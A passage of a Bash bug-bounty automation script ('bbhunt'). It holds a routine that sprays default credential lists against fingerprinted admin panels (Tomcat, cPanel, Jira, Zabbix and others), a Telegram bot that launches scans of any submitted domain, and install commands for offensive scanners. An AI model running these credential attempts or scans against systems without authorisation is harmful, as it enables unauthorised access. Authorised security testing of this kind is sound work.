    if echo "$httpx_data" | grep -qiE "ansible tower|awx"; then
        _detect_try "AWX" "/api/v2/tokens/" "username" "password" \
            "admin:password" "admin:admin" "awx:awx" && return 0
    fi

    # ── Nagios ───────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "nagios"; then
        _try_basic_auth "Nagios" "${base_url}/nagios/" \
            "nagiosadmin:nagiosadmin" "nagios:nagios" \
            "admin:admin" "nagiosadmin:password" && return 0
    fi

    # ── Zabbix ───────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "zabbix"; then
        _detect_try "Zabbix" "/zabbix/index.php" "name" "password" \
            "Admin:zabbix" "admin:zabbix" "admin:admin" \
            "zabbix:zabbix" "guest:" && return 0
    fi

    # ── OpenVPN Access Server ─────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "openvpn access server|openvpn-as"; then
        _detect_try "OpenVPN-AS" "/rest/GetSession" "username" "password" \
            "openvpn:openvpn" "admin:admin" "admin:password" && return 0
    fi

    # ── cPanel / WHM ─────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "cpanel|whm"; then
        _detect_try "cPanel" "/login/?login_only=1" "user" "pass" \
            "root:root" "admin:admin" "cpanel:cpanel" \
            "admin:password" "root:password" && return 0
    fi

    # ── Harbor (Container Registry) ───────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "harbor"; then
        _detect_try "Harbor" "/c/login" "principal" "password" \
            "admin:Harbor12345" "admin:admin" "admin:password" && return 0
    fi

    # ── Rundeck ───────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "rundeck"; then
        _detect_try "Rundeck" "/j_security_check" "j_username" "j_password" \
            "admin:admin" "admin:password" "rundeck:admin" && return 0
    fi

    # ── Gitea ─────────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "gitea|gogs"; then
        _detect_try "Gitea" "/user/login" "user_name" "password" \
            "gitea:gitea" "admin:admin" "admin:password" \
            "gogs:gogs" "root:root" && return 0
    fi

    # ── TeamCity ─────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "teamcity"; then
        _detect_try "TeamCity" "/login.html" "username" "password" \
            "admin:admin" "teamcity:teamcity" "admin:password" && return 0
    fi

    # ── Confluence ───────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "confluence"; then
        _detect_try "Confluence" "/dologin.action" "os_username" "os_password" \
            "admin:admin" "admin:confluence" "confluence:confluence" && return 0
    fi

    # ── Jira ─────────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "jira"; then
        _detect_try "Jira" "/login.jsp" "os_username" "os_password" \
            "admin:admin" "jira:jira" "admin:password" && return 0
    fi

    # ── Apache Tomcat Manager ─────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "tomcat|apache tomcat"; then
        _try_basic_auth "Tomcat" "${base_url}/manager/html" \
            "admin:admin" "tomcat:tomcat" "admin:tomcat" \
            "tomcat:s3cret" "admin:s3cret" "manager:manager" \
            "role1:role1" "both:tomcat" && return 0
    fi

    # ── Prometheus / Alertmanager ─────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "prometheus|alertmanager"; then
        _try_basic_auth "Prometheus" "${base_url}/-/healthy" \
            "admin:admin" "prometheus:prometheus" && return 0
    fi

    log_info "  No default credentials matched — trying custom wordlist on common login paths..."

    # Generic fallback: try target-specific wordlist on common login paths
    if [[ -s "$custom_wl" ]]; then
        local generic_paths=("/login" "/login.php" "/login.html" "/admin" "/admin/login"
                             "/wp-login.php" "/user/login" "/signin" "/auth/login")
        for lpath in "${generic_paths[@]}"; do
            local test_url="${base_url}${lpath}"
            local http_code; http_code=$(curl -s -o /dev/null -w "%{http_code}" \
                --connect-timeout 5 --max-time 8 "$test_url" 2>/dev/null)
            if [[ "$http_code" =~ ^(200|302|301|403)$ ]]; then
                log_info "  Found login-like path: ${lpath} (${http_code}) — skipping generic brute (use --auth-user/pass)"
            fi
        done
    fi

    log_info "  No default credentials matched — continuing unauthenticated"
}

# ─── Notification System ─────────────────────────────────────────────────────

load_notify_config() {
    [[ -f "$NOTIFY_CONF" ]] || return 0
    # shellcheck disable=SC1090
    while IFS='=' read -r key val; do
        [[ "$key" =~ ^# ]] && continue
        [[ -z "$key" ]] && continue
        val="${val//\"/}"
        case "$key" in
            TELEGRAM_BOT_TOKEN) [[ -z "$TELEGRAM_BOT_TOKEN" ]] && TELEGRAM_BOT_TOKEN="$val" ;;
            TELEGRAM_CHAT_ID)   [[ -z "$TELEGRAM_CHAT_ID"   ]] && TELEGRAM_CHAT_ID="$val" ;;
            DISCORD_WEBHOOK_URL) [[ -z "$DISCORD_WEBHOOK_URL" ]] && DISCORD_WEBHOOK_URL="$val" ;;
            NOTIFY_EMAIL_TO)    [[ -z "$NOTIFY_EMAIL_TO"    ]] && NOTIFY_EMAIL_TO="$val" ;;
            SMTP_HOST)          [[ -z "$SMTP_HOST" || "$SMTP_HOST" == "smtp.gmail.com" ]] && SMTP_HOST="$val" ;;
            SMTP_PORT)          SMTP_PORT="$val" ;;
            SMTP_USER)          [[ -z "$SMTP_USER" ]] && SMTP_USER="$val" ;;
            SMTP_PASS)          [[ -z "$SMTP_PASS" ]] && SMTP_PASS="$val" ;;
        esac
    done < "$NOTIFY_CONF"
}

# Persistent across sessions — survives bot restarts
TG_MSG_ID_FILE="${HOME}/.config/bbhunt/tg_msg_ids.txt"

notify_tg() {
    [[ -z "$TELEGRAM_BOT_TOKEN" || -z "$TELEGRAM_CHAT_ID" ]] && return 0
    local msg="$1"
    local resp; resp=$(curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        --data-urlencode "text=${msg}" \
        -d "parse_mode=Markdown" \
        --connect-timeout 10 --max-time 15 2>/dev/null || echo "")
    # Persistently track sent message_id so /clear can delete it across sessions
    local mid; mid=$(echo "$resp" | python3 -c "
import sys,json
try: print(json.load(sys.stdin)['result']['message_id'])
except: pass" 2>/dev/null || echo "")
    [[ -n "$mid" ]] && echo "$mid" >> "$TG_MSG_ID_FILE"
}

# Delete a single Telegram message by ID (silently — fails ok for user messages)
tg_delete_msg() {
    local mid="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "message_id=${mid}" \
        --connect-timeout 5 --max-time 8 \
        -o /dev/null 2>/dev/null || true
}

# Delete all bot messages: tracked ones + range-sweep around the /clear trigger
# ref_msg_id = the message_id of the user's /clear command (used as range anchor)
tg_clear_chat() {
    local ref_msg_id="${1:-0}"

    # Run everything in background so the bot stays responsive immediately
    (
        # 1 — Delete all tracked message IDs from persistent file
        if [[ -f "$TG_MSG_ID_FILE" ]]; then
            while IFS= read -r mid; do
                [[ -z "$mid" ]] && continue
                tg_delete_msg "$mid"
            done < "$TG_MSG_ID_FILE"
            rm -f "$TG_MSG_ID_FILE"
        fi

        # 2 — Range sweep: try deleting up to 300 messages before the /clear command.
        #     Covers untracked messages (pre-bot, curl tests, earlier sessions).
        #     Failures are silent — Telegram rejects anything the bot didn't send.
        if [[ "$ref_msg_id" -gt 0 ]]; then
            local start=$(( ref_msg_id - 300 ))
            [[ "$start" -lt 1 ]] && start=1
            for (( mid=start; mid<=ref_msg_id; mid++ )); do
                tg_delete_msg "$mid"
            done
        fi
    ) &
}

notify_discord() {
    [[ -z "$DISCORD_WEBHOOK_URL" ]] && return 0
    local msg="$1"
    curl -s -X POST "$DISCORD_WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d "{\"content\": $(python3 -c "import json,sys; print(json.dumps(sys.argv[1]))" "$msg" 2>/dev/null || echo "\"${msg}\"")}" \
        --connect-timeout 10 --max-time 15 \
        -o /dev/null 2>/dev/null || true
}

notify_email() {
    [[ -z "$NOTIFY_EMAIL_TO" || -z "$SMTP_USER" || -z "$SMTP_PASS" ]] && return 0
    local subject="$1" body="$2"
    curl -s "smtps://${SMTP_HOST}:465" \
        --ssl-reqd \
        --mail-from "$SMTP_USER" \
        --mail-rcpt "$NOTIFY_EMAIL_TO" \
        --user "${SMTP_USER}:${SMTP_PASS}" \
        -T <(printf "From: bbhunt <%s>\nTo: %s\nSubject: %s\n\n%s\n" \
            "$SMTP_USER" "$NOTIFY_EMAIL_TO" "$subject" "$body") \
        --connect-timeout 15 --max-time 30 \
        -o /dev/null 2>/dev/null || true
}

# Send to all configured channels
notify_all() {
    local msg="$1"
    notify_tg "$msg"
    notify_discord "$msg"
    # Email only for critical/final events (subject extracted from first line)
    local subj; subj=$(echo "$msg" | head -1 | cut -c1-80)
    notify_email "[bbhunt] ${subj}" "$msg"
}

# Poll Telegram for commands during scan (non-blocking, runs in background between phases)
tg_poll_commands() {
    [[ -z "$TELEGRAM_BOT_TOKEN" || -z "$TELEGRAM_CHAT_ID" ]] && return 0

    local updates; updates=$(curl -s \
        "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=$((TG_LAST_UPDATE_ID+1))&timeout=1&limit=10" \
        --connect-timeout 8 --max-time 12 2>/dev/null || echo "")

    [[ -z "$updates" ]] && return 0

    # Parse updates with python3
    local cmds; cmds=$(python3 -c "
import sys, json
try:
    data = json.loads(sys.argv[1])
    for upd in data.get('result', []):
        uid = upd.get('update_id', 0)
        msg = upd.get('message', {})
        chat_id = str(msg.get('chat', {}).get('id', ''))
        text = msg.get('text', '').strip()
        if text:
            print(f'{uid}|{chat_id}|{text}')
except Exception as e:
    pass
" "$updates" 2>/dev/null || echo "")

    [[ -z "$cmds" ]] && return 0

    while IFS='|' read -r update_id chat_id text; do
        [[ -z "$update_id" ]] && continue
        TG_LAST_UPDATE_ID="$update_id"

        # Only respond to our own chat ID
        [[ "$chat_id" != "$TELEGRAM_CHAT_ID" ]] && continue

        case "${text,,}" in
            /status|status)
                notify_tg "📊 *Scan Status*
Target: \`${TARGET}\`
Phase: ${CURRENT_PHASE:-starting}
Output: \`${OUTDIR}\`
Running since: $(date -d "@${START_TIME}" '+%H:%M:%S' 2>/dev/null || date -r "$START_TIME" '+%H:%M:%S' 2>/dev/null || echo 'N/A')"
                ;;
            /findings|findings)
                local n_total; n_total=$(wc -l < "$VULN_DIR/nuclei/all_findings.jsonl" 2>/dev/null || echo 0)
                local n_crit; n_crit=$(wc -l < "$VULN_DIR/nuclei/critical_high.jsonl" 2>/dev/null || echo 0)
                local n_xss; n_xss=$(wc -l < "$VULN_DIR/xss/dalfox_findings.txt" 2>/dev/null || echo 0)
                notify_tg "🔍 *Current Findings*
Nuclei total: ${n_total}
Critical/High: ${n_crit}
XSS: ${n_xss}
Auth: ${AUTH_MODE}"
                ;;
            /stop|stop)
                notify_tg "🛑 Stop requested. Finishing current phase then exiting..."
                TG_STOP_REQUESTED=true
                ;;
            /report|report)
                if [[ -f "${REPORT_DIR}/summary.md" ]]; then
                    local snippet; snippet=$(head -40 "${REPORT_DIR}/summary.md" 2>/dev/null | tr '|' ' ')
                    notify_tg "📄 *Report snippet:*\n\`\`\`\n${snippet}\n\`\`\`"
                else
                    notify_tg "⏳ Report not generated yet. Scan still running."
                fi
                ;;
            /help|help)
                notify_tg "🤖 *bbhunt bot commands:*
/status — current phase & target
/findings — finding counts so far
/report — report snippet
/stop — stop after current phase
/clear — delete bot messages
/help — this message"
                ;;
            /clear)
                tg_clear_chat
                notify_tg "🧹 Chat cleared."
                ;;
            /start)
                notify_tg "👋 Scan in progress on \`${TARGET}\`. Send /status for details."
                ;;
        esac
    done <<< "$cmds"
}

# Standalone Telegram bot listener (--bot-listen mode)
# Accepts /scan <domain> commands from Telegram
tg_bot_listen() {
    [[ -z "$TELEGRAM_BOT_TOKEN" || -z "$TELEGRAM_CHAT_ID" ]] && {
        log_error "Bot listen mode requires --tg-token and --tg-chat (or notify.conf)"
        exit 1
    }
    log_phase "Telegram Bot Listener"
    notify_tg "🤖 *bbhunt bot online*
Send me commands:
/scan \`example.com\` — start new scan
/status — running scan status
/findings — current findings
/stop — stop scan
/help — show commands"

    log_ok "Bot listening for Telegram commands. Press Ctrl+C to stop."
    local active_pid=""

    # Helper: read a field from the shared state file
    state_get() { grep "^${1}=" "$STATE_FILE" 2>/dev/null | cut -d= -f2-; }
    # Helper: check if a scan is active (via state file PID or local active_pid)
    scan_active() {
        local pid
        pid=$(state_get PID)
        [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null && return 0
        [[ -n "$active_pid" ]] && kill -0 "$active_pid" 2>/dev/null && return 0
        return 1
    }
    # Helper: get active scan PID (state file takes precedence)
    scan_pid() {
        local pid
        pid=$(state_get PID)
        if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then echo "$pid"; return; fi
        echo "$active_pid"
    }

    # Skip backlog: fetch all pending updates, find the highest update_id,
    # then start polling from the next one so old messages are ignored
    local last_id; last_id=$(curl -s \
        "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=100" \
        --connect-timeout 8 --max-time 12 2>/dev/null | \
        python3 -c "
import sys,json
try:
    r = json.load(sys.stdin).get('result',[])
    print(max(u['update_id'] for u in r) if r else 0)
except: print(0)" 2>/dev/null || echo "0")
    log_ok "Skipped backlog (last_id=${last_id}) — only responding to new messages."

    while true; do
        local updates; updates=$(curl -s \
            "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=$((last_id+1))&timeout=30&limit=10" \
            --connect-timeout 10 --max-time 40 2>/dev/null || echo "")

        [[ -z "$updates" ]] && { sleep 5; continue; }

        local cmds; cmds=$(python3 -c "
import sys, json
try:
    data = json.loads(sys.argv[1])
    for upd in data.get('result', []):
        uid = upd.get('update_id', 0)
        msg = upd.get('message', {})
        chat_id = str(msg.get('chat', {}).get('id', ''))
        msg_id  = msg.get('message_id', 0)
        text = msg.get('text', '').strip()
        if text: print(f'{uid}|{chat_id}|{msg_id}|{text}')
except: pass
" "$updates" 2>/dev/null || echo "")

        while IFS='|' read -r update_id chat_id msg_id text; do
            [[ -z "$update_id" ]] && continue
            last_id="$update_id"
            [[ "$chat_id" != "$TELEGRAM_CHAT_ID" ]] && continue

            local cmd="${text,,}"

            if [[ "$cmd" =~ ^/scan[[:space:]]+(.+)$ ]]; then
                local domain="${BASH_REMATCH[1]// /}"
                if scan_active; then
                    notify_tg "⚠️ Scan already running (PID $(scan_pid)) on \`$(state_get TARGET)\`. Use /stop first."
                else
                    notify_tg "🚀 Starting scan for \`${domain}\`..."
                    bash "$0" -d "$domain" \
                        --tg-token "$TELEGRAM_BOT_TOKEN" \
                        --tg-chat "$TELEGRAM_CHAT_ID" \
                        ${DISCORD_WEBHOOK_URL:+--discord "$DISCORD_WEBHOOK_URL"} \
                        &
                    active_pid=$!
                    log_ok "Scan started: PID ${active_pid} → ${domain}"
                fi

            elif [[ "$cmd" == "/stop" ]]; then
                local spid; spid=$(scan_pid)
                if [[ -n "$spid" ]] && kill -0 "$spid" 2>/dev/null; then
                    kill "$spid" 2>/dev/null
                    rm -f "$STATE_FILE"
                    notify_tg "🛑 Scan (PID ${spid}) stopped."
                    active_pid=""
                else
                    notify_tg "ℹ️ No active scan to stop."
                fi

            elif [[ "$cmd" == "/status" ]]; then
                if scan_active; then
                    local s_target s_phase s_outdir s_start s_pid
                    s_pid=$(scan_pid)
                    s_target=$(state_get TARGET)
                    s_phase=$(state_get PHASE)
                    s_outdir=$(state_get OUTDIR)
                    s_start=$(state_get START)
                    notify_tg "📊 *Scan Status*
Target: \`${s_target}\`
Phase: ${s_phase:-starting}
Output: \`${s_outdir}\`
PID: ${s_pid}
Running since: $(date -d "@${s_start}" '+%H:%M:%S' 2>/dev/null || echo 'N/A')"
                else
                    notify_tg "💤 No scan running. Send \`/scan domain.com\` to start."
                fi

            elif [[ "$cmd" == "/findings" ]]; then
                if [[ -f "$STATE_FILE" ]]; then
                    local s_outdir; s_outdir=$(state_get OUTDIR)
                    local vuln="${s_outdir}/vulns"
                    local n_total n_crit n_xss
                    n_total=$(wc -l < "${vuln}/nuclei/all_findings.jsonl" 2>/dev/null || echo 0)
                    n_crit=$(wc -l < "${vuln}/nuclei/critical_high.jsonl" 2>/dev/null || echo 0)
                    n_xss=$(wc -l < "${vuln}/xss/dalfox_findings.txt" 2>/dev/null || echo 0)
                    notify_tg "🔍 *Current Findings* (\`$(state_get TARGET)\`)
Nuclei total: ${n_total}
Critical/High: ${n_crit}
XSS: ${n_xss}"
                else
                    notify_tg "ℹ️ No active scan. No findings available."
                fi

            elif [[ "$cmd" == "/clear" ]]; then
                tg_clear_chat "$msg_id"
                notify_tg "🧹 Chat cleared."

            elif [[ "$cmd" == "/help" ]]; then
                notify_tg "🤖 *bbhunt commands:*
/scan \`example.com\` — start new scan
/stop — stop running scan
/status — check if scan is running
/clear — delete all bot messages
/help — this message"

            elif [[ "$cmd" == "/start" ]]; then
                notify_tg "👋 bbhunt bot ready. Send /help for commands."
            fi

        done <<< "$cmds"
    done
}

# Track current phase name for /status command
CURRENT_PHASE="init"
TG_STOP_REQUESTED=false

# ─── Tool helpers ─────────────────────────────────────────────────────────────
has_tool() { command -v "$1" &>/dev/null; }

# Exact install command for each tool
declare -A TOOL_INSTALL_CMDS=(
    [subfinder]="go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    [amass]="go install github.com/owasp-amass/amass/v4/...@master"
    [assetfinder]="go install github.com/tomnomnom/assetfinder@latest"
    [httpx]="go install github.com/projectdiscovery/httpx/cmd/httpx@latest"
    [nuclei]="go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    [katana]="go install github.com/projectdiscovery/katana/cmd/katana@latest"
    [dnsx]="go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    [naabu]="go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
    [shuffledns]="go install github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
    [alterx]="go install github.com/projectdiscovery/alterx/cmd/alterx@latest"
    [notify]="go install github.com/projectdiscovery/notify/cmd/notify@latest"
    [interactsh-client]="go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
    [gau]="go install github.com/lc/gau/v2/cmd/gau@latest"
    [waybackurls]="go install github.com/tomnomnom/waybackurls@latest"
    [anew]="go install github.com/tomnomnom/anew@latest"
    [qsreplace]="go install github.com/tomnomnom/qsreplace@latest"
    [unfurl]="go install github.com/tomnomnom/unfurl@latest"
    [gf]="go install github.com/tomnomnom/gf@latest && git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf"
    [dalfox]="go install github.com/hahwul/dalfox/v2@latest"
    [puredns]="go install github.com/d3mondev/puredns/v2@latest"
    [gowitness]="go install github.com/sensepost/gowitness@latest"
    [subzy]="go install github.com/PentestPad/subzy@latest"
    [subjack]="go install github.com/haccer/subjack@latest"
    [nomore403]="go install github.com/devploit/nomore403@latest"
    [ffuf]="sudo apt install -y ffuf  # or: go install github.com/ffuf/ffuf/v2@latest"
    [nmap]="sudo apt install -y nmap"
    [masscan]="sudo apt install -y masscan"
    [sqlmap]="sudo apt install -y sqlmap"
    [feroxbuster]="sudo apt install -y feroxbuster"
    # massdns: required by puredns; build from source if apt unavailable
    [massdns]="sudo apt install -y massdns  # or: git clone https://github.com/blechschmidt/massdns /tmp/massdns && cd /tmp/massdns && make && cp bin/massdns ~/go/bin/"
    [waymore]="pip3 install waymore"
    [arjun]="pip3 install arjun"
    [trufflehog]="curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin"
    # naabu requires libpcap-dev; install prebuilt binary to avoid CGO issues
    [naabu]="NAABU_VER=\$(curl -s https://api.github.com/repos/projectdiscovery/naabu/releases/latest | grep '\"tag_name\"' | cut -d'\"' -f4); curl -sL \"https://github.com/projectdiscovery/naabu/releases/download/\${NAABU_VER}/naabu_\${NAABU_VER#v}_linux_amd64.zip\" -o /tmp/naabu.zip && unzip -q /tmp/naabu.zip naabu -d ~/go/bin/ && chmod +x ~/go/bin/naabu && rm /tmp/naabu.zip"
    # corsy has no pip package; clone repo and create a wrapper script
    [corsy]="git clone https://github.com/s0md3v/Corsy.git ~/tools/corsy && printf '#!/bin/bash\npython3 ~/tools/corsy/corsy.py \"\$@\"\n' > ~/go/bin/corsy && chmod +x ~/go/bin/corsy"
)

require_tool() {
    local tool="$1"
    if ! has_tool "$tool"; then
        local cmd="${TOOL_INSTALL_CMDS[$tool]:-}"
        if [[ -n "$cmd" ]]; then
            log_warn "Tool not found: ${BOLD}${tool}${RESET} — skipping this step"
            log_warn "  Install with: ${CYAN}${cmd}${RESET}"
        else
            log_warn "Tool not found: ${BOLD}${tool}${RESET} — skipping this step"
        fi
        return 1
    fi
    return 0
}

# Save a timed-out or skipped command to the deferred script for later execution
defer_cmd() {
    local label="$1"; shift
    local deferred_script="${OUTDIR}/deferred_scans.sh"
    if [[ ! -f "$deferred_script" ]]; then
        echo "#!/usr/bin/env bash" > "$deferred_script"
        echo "# Deferred scans from bbhunt — run these manually when ready" >> "$deferred_script"
        echo "# Generated: $(date)" >> "$deferred_script"
        chmod +x "$deferred_script"
    fi
    echo -e "\n# ${label}" >> "$deferred_script"
    echo "$*" >> "$deferred_script"
    log_warn "  Timed out — command saved to: ${CYAN}${deferred_script}${RESET}  (run later with: bash deferred_scans.sh)"
}

anew_append() {
    # Like `anew` but falls back to sort -u if anew not available
    local file="$1"
    if has_tool anew; then
        anew "$file"
    else
        cat >> "$file"; sort -u "$file" -o "$file"
    fi
}

check_tools() {
    log_phase "Tool Availability Check"
    local tools=(
        subfinder amass assetfinder httpx nuclei katana
        ffuf nmap masscan massdns dnsx puredns shuffledns
        gau waybackurls waymore dalfox sqlmap arjun
        gowitness subzy subjack anew qsreplace unfurl gf
        notify interactsh-client alterx naabu trufflehog
        corsy nomore403 feroxbuster
    )
    local missing=()
    for t in "${tools[@]}"; do
        if has_tool "$t"; then
            echo -e "  ${GREEN}✓${RESET} $t"
        else
            echo -e "  ${RED}✗${RESET} $t"
            missing+=("$t")
        fi
    done
    echo
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}${BOLD}Missing tools — exact install commands:${RESET}"
        for t in "${missing[@]}"; do
            local cmd="${TOOL_INSTALL_CMDS[$t]:-unknown — run: $0 --install}"
            echo -e "  ${RED}${BOLD}${t}${RESET}"
            echo -e "    ${CYAN}${cmd}${RESET}"
        done
        echo
        log_info "To install everything at once: ${CYAN}$0 --install${RESET}"
    else
        log_ok "All tools available!"
    fi
}

install_tools() {
    log_phase "Installing Bug Bounty Tools"
    log_info "This will install Go tools and Python tools. May take a few minutes..."

    # Go tools
    local go_tools=(
        "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
        "github.com/projectdiscovery/httpx/cmd/httpx@latest"
        "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        "github.com/projectdiscovery/katana/cmd/katana@latest"
        "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
        "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
        "github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
        "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
        "github.com/projectdiscovery/alterx/cmd/alterx@latest"
        "github.com/projectdiscovery/notify/cmd/notify@latest"
        "github.com/tomnomnom/waybackurls@latest"
        "github.com/lc/gau/v2/cmd/gau@latest"
        "github.com/tomnomnom/anew@latest"
        "github.com/tomnomnom/qsreplace@latest"
        "github.com/tomnomnom/unfurl@latest"
        "github.com/tomnomnom/gf@latest"
        "github.com/hahwul/dalfox/v2@latest"
        "github.com/d3mondev/puredns/v2@latest"
        "github.com/sensepost/gowitness@latest"
        "github.com/PentestPad/subzy@latest"
        "github.com/haccer/subjack@latest"
        "github.com/devploit/nomore403@latest"
        "github.com/owasp-amass/amass/v4/...@master"
        "github.com/tomnomnom/assetfinder@latest"
    )

    for pkg in "${go_tools[@]}"; do
        tool_name=$(basename "${pkg%%@*}" | sed 's/cmd\///')
        echo -ne "  Installing ${CYAN}${tool_name}${RESET}..."
        if go install -v "$pkg" &>/dev/null 2>&1; then
            echo -e " ${GREEN}✓${RESET}"
        else
            echo -e " ${RED}✗ (failed)${RESET}"
        fi
    done

    # massdns — required by puredns; build from source (no sudo needed)
    if ! has_tool massdns; then
        log_info "Building massdns from source..."
        local _massdns_dir; _massdns_dir=$(mktemp -d)
        if git clone -q https://github.com/blechschmidt/massdns.git "$_massdns_dir" 2>/dev/null; then
            if (cd "$_massdns_dir" && make -s 2>/dev/null && cp bin/massdns "$HOME/go/bin/" && chmod +x "$HOME/go/bin/massdns"); then
                echo -e "  massdns ${GREEN}✓${RESET}"
            else
                echo -e "  massdns ${RED}✗ (build failed — try: sudo apt install -y massdns)${RESET}"
            fi
        else
            echo -e "  massdns ${RED}✗ (clone failed — try: sudo apt install -y massdns)${RESET}"
        fi
        rm -rf "$_massdns_dir"
    else
        echo -e "  massdns ${GREEN}✓ (already installed)${RESET}"
    fi

    # naabu — requires libpcap; install prebuilt binary to avoid CGO build errors
    log_info "Installing naabu (prebuilt binary)..."
    local naabu_ver
    naabu_ver=$(curl -s https://api.github.com/repos/projectdiscovery/naabu/releases/latest | grep '"tag_name"' | cut -d'"' -f4)
    if [[ -n "$naabu_ver" ]]; then
        local naabu_zip="/tmp/naabu_${naabu_ver}.zip"
        curl -sL "https://github.com/projectdiscovery/naabu/releases/download/${naabu_ver}/naabu_${naabu_ver#v}_linux_amd64.zip" -o "$naabu_zip" && \
        unzip -qo "$naabu_zip" naabu -d "$HOME/go/bin/" && \
        chmod +x "$HOME/go/bin/naabu" && \
        rm -f "$naabu_zip" && \
        echo -e "  naabu ${GREEN}✓${RESET}" || echo -e "  naabu ${RED}✗ (failed)${RESET}"
    else
        echo -e "  naabu ${RED}✗ (could not fetch release version)${RESET}"
    fi

    # corsy — no pip package; clone repo and wrap as a script
    log_info "Installing corsy (from GitHub)..."
    if [[ ! -d "$HOME/tools/corsy" ]]; then
        git clone -q https://github.com/s0md3v/Corsy.git "$HOME/tools/corsy" 2>/dev/null || true
    fi
    if [[ -f "$HOME/tools/corsy/corsy.py" ]]; then
        printf '#!/bin/bash\npython3 %s/tools/corsy/corsy.py "$@"\n' "$HOME" > "$HOME/go/bin/corsy"
        chmod +x "$HOME/go/bin/corsy"
        echo -e "  corsy ${GREEN}✓${RESET}"
    else
        echo -e "  corsy ${RED}✗ (clone failed)${RESET}"
    fi

    # Python tools via pip
    log_info "Installing Python tools..."
    pip3 install -q arjun waymore 2>/dev/null || true

    # Apt tools
    log_info "Installing apt tools..."
    sudo apt-get install -y -qq nmap masscan ffuf feroxbuster sqlmap 2>/dev/null || true

    # GF patterns
    if has_tool gf && [[ ! -d ~/.gf ]]; then
        log_info "Setting up GF patterns..."
        git clone -q https://github.com/1ndianl33t/Gf-Patterns ~/.gf 2>/dev/null || true
    fi

    # Update Nuclei templates
    if has_tool nuclei; then
        log_info "Updating Nuclei templates..."
        nuclei -update-templates -silent 2>/dev/null || true
    fi

    log_ok "Installation complete. Run: $0 --check"
}

setup_notify_config() {
    # Create a sample notify.conf if not present
    if [[ ! -f "$NOTIFY_CONF" ]]; then
        mkdir -p "$(dirname "$NOTIFY_CONF")"
        cat > "$NOTIFY_CONF" << 'CONF'
# bbhunt notification configuration
# Uncomment and fill in the values you want to use

# Telegram Bot (get token from @BotFather, get your chat ID from @userinfobot)
#TELEGRAM_BOT_TOKEN=123456789:AAAA_your_bot_token_here
#TELEGRAM_CHAT_ID=987654321

# Discord Webhook (Server Settings → Integrations → Webhooks → Copy URL)
#DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...

# Email via SMTP (Gmail: use App Password, not your real password)
#NOTIFY_EMAIL_TO=you@example.com
#SMTP_HOST=smtp.gmail.com
#SMTP_PORT=587
#SMTP_USER=yourbot@gmail.com
#SMTP_PASS=your_app_password_here
CONF
        log_ok "Created sample notify config: ${NOTIFY_CONF}"
        log_info "Edit it and add your Telegram/Discord/Email credentials."
    fi
}

# ─── Resolver setup ───────────────────────────────────────────────────────────
setup_resolvers() {
    if [[ -f "$RESOLVERS" ]] && $RESUME; then
        log_dim "  Resolvers already downloaded, skipping."
        return
    fi
    log_info "Downloading fresh DNS resolvers..."
    if curl -s --connect-timeout 10 "$RESOLVERS_URL" -o "$RESOLVERS" 2>/dev/null; then
        local count; count=$(wc -l < "$RESOLVERS")
        log_ok "  Got ${count} resolvers"
    else
        log_warn "  Could not download resolvers. Using system defaults."
        echo -e "8.8.8.8\n8.8.4.4\n1.1.1.1\n1.0.0.1\n9.9.9.9" > "$RESOLVERS"
    fi
}

# ─── Phase 1: Subdomain Enumeration ───────────────────────────────────────────
phase_recon() {
    log_phase "Phase 1: Subdomain Enumeration → $TARGET"

    # Always seed with the base target so it is never missed downstream
    echo "$TARGET" | anew_append "$ALL_SUBS" >/dev/null

    # Passive: subfinder
    if require_tool subfinder; then
        log_info "Running subfinder..."
        subfinder -d "$TARGET" -silent -all -recursive 2>/dev/null | \
            anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  subfinder: ${_n} new"; }
    fi

    # Passive: amass
    if require_tool amass; then
        log_info "Running amass (passive)..."
        timeout 300 amass enum -passive -d "$TARGET" -silent 2>/dev/null | \
            anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  amass passive: ${_n} new"; }
    fi

    # Passive: assetfinder
    if require_tool assetfinder; then
        log_info "Running assetfinder..."
        assetfinder --subs-only "$TARGET" 2>/dev/null | \
